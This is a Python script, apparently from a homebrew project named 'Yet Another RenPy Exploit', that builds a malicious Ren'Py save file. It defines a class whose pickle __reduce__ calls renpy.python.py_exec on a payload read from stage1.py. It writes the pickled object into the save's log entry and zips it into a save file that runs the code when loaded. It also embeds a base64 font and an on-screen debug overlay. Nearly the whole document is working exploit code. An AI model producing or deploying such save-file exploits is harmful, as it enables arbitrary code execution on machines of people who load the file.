import pickle
import renpy
import zipfile
import os

# load our unsafe-python goodness
f = open("stage1.py", "rt")
payload = f.readlines()
f.close()

# Read base64 encoded font
script_dir = os.path.dirname(os.path.abspath(__file__))
font_b64_path = os.path.join(script_dir, "mono_b64.txt")


if not os.path.exists(font_b64_path):
    print("ERROR: mono_b64.txt not found at: " + font_b64_path)
    exit(1)

with open(font_b64_path, "r") as f:
    FONT_B64 = f.read()
    print("Loaded font: " + str(len(FONT_B64)) + " bytes (base64)")

SCRIPT_PREFIX = """
import traceback
import base64


__version__ = "%s"

# Decode embedded font
font_data = base64.b64decode('''%s''')

# Write font to a temporary location (using renpy.file for write access)
try:
    with open(renpy.config.savedir + '/debug_mono.ttf', 'wb') as f:
        f.write(font_data)
    font_path = renpy.config.savedir + '/debug_mono.ttf'
except:
    font_path = None

# Debug overlay storage
debug_log = []
exception_occurred = False

def delete_last_line(event, interact=True, **kwargs):
    global debug_log
    global exception_occurred
    if len(debug_log) > 0 and exception_occurred and interact and event == "end":
        exception_occurred = False
        debug_log.pop()

# Create debug character with fullscreen overlay
debug_char = renpy.store.Character(
    None,
    callback=delete_last_line,
    what_color="#00ff00",
    what_size=18,
    what_font=font_path,
    what_xalign=0.0,
    what_yalign=0.0,
    what_outlines=[(2, "#000000", 0, 0)],
    what_background=renpy.store.Solid("#000000"),
    ctc=None,
    ctc_pause=None,
    ctc_timedpause=None,
    what_slow_cps=0,
    window_background=renpy.store.Solid("#000000"),
    window_xfill=True,
    window_yfill=True,
    window_xalign=0.0,
    window_yalign=0.0,
    window_left_padding=20,
    window_top_padding=20,
    window_left_margin=0,
    window_right_margin=0,
    window_top_margin=0,
    window_bottom_margin=0
)

def print(*args):
    global debug_log
    strings = " ".join([str(arg) for arg in list(args)]).split("\\n")
    debug_log.extend(strings)
    if len(debug_log) > 32:
        debug_log = debug_log[-32:]
    full_msg = "{nw}" + "\\n".join(debug_log)
    renpy.invoke_in_new_context(debug_char, full_msg)

def print_exc(string):
    global exception_occurred
    print("{b}[EXCEPTION] " + string + "{/b}")
    exception_occurred = True
    print("An error occurred! Press X(or O) to continue.{w}")

try:
    print("=== YET ANOTHER RENPY EXPLOIT " + __version__ + " ===")

""" % (
    os.getenv("YARPE_VERSION", "custom build"),
    FONT_B64,
)

SCRIPT_SUFFIX = """

except Exception as exc:
    exc_msg = traceback.format_exc()
    print_exc(exc_msg)
"""

# indent the whole injected payload
payload = "\n".join(["    " + l for l in payload])


class RCE(object):
    def __reduce__(self):
        return renpy.python.py_exec, (SCRIPT_PREFIX + payload + SCRIPT_SUFFIX,)


pickled = pickle.dumps(RCE(), protocol=2)
with open("savegame_container/log", "wb") as f:
    f.write(pickled)

with zipfile.ZipFile("1-1-LT1.save", "w") as zip:
    zip.write("savegame_container/extra_info", "extra_info")
    zip.write("savegame_container/json", "json")
    zip.write("savegame_container/log", "log")
    zip.write("savegame_container/renpy_version", "renpy_version")
    zip.write("savegame_container/screenshot.png", "screenshot.png")
